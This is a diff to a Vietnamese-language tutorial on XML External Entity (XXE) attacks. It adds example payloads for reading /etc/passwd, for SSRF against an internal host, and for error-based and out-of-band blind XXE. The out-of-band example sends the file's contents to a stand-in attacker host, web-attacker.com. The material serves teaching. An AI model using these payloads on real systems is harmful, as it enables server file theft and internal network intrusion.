@@ -254,14 +254,33 @@
 <br> 3.2 Các kiểu tấn công XXE <a name="11"></a></br>
  - `Khai thác XXE để truy xuất tệp`: Thực thể bên ngoài được xác định có chứa nội dung của tệp và được trả lại trong phản hồi của ứng dụng.
     - Ví dụ: 
-              `<?xml version="1.0" encoding="UTF-8"?>
+    
+             `<?xml version="1.0" encoding="UTF-8"?>
               <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
               <stockCheck><productId>&xxe;</productId></stockCheck>`
               
  - `Khai thác XXE để thực hiện các cuộc tấn công SSRF`: Thực thể bên ngoài được xác định dựa trên URL đến hệ thống back-end.
+    - Ví dụ:
+
+            `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`
+            
  - `Khai thác Blind XXE exfiltrate dữ liệu ngoài băng tần`: nơi dữ liệu nhạy cảm được truyền từ máy chủ ứng dụng đến hệ thống mà kẻ tấn công kiểm soát.
+    - Ví dụ:
+
+           `<!ENTITY % file SYSTEM "file:///etc/passwd">
+            <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+            %eval;
+            %exfiltrate;`
+           
  - `Khai thác Blind XXE để truy xuất dữ liệu thông qua thông báo lỗi`: nơi kẻ tấn công có thể kích hoạt thông báo lỗi phân tích cú pháp chứa dữ liệu nhạy cảm.
-<br> 3.2 Các kiểu tấn công XXE <a name="11"></a></br>
+    - Ví dụ:
+            
+            `<!ENTITY % file SYSTEM "file:///etc/passwd">
+             <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+             %eval;
+             %error;`
+              
+<br> 3.2 mô phỏng code XXE <a name="11"></a></br>
 
 <br> 3.4 Khai thác XXE <a name="11"></a></br>
  - Đây là trang web có lỗi XXE:
@@ -272,3 +291,4 @@
  
    ![image](https://user-images.githubusercontent.com/101852647/169954434-21924bfe-e84a-42f1-9a72-d7a32acb43f1.png)
 
+  <br> 3.4 Code khắc phục XXE <a name="11"></a></br>
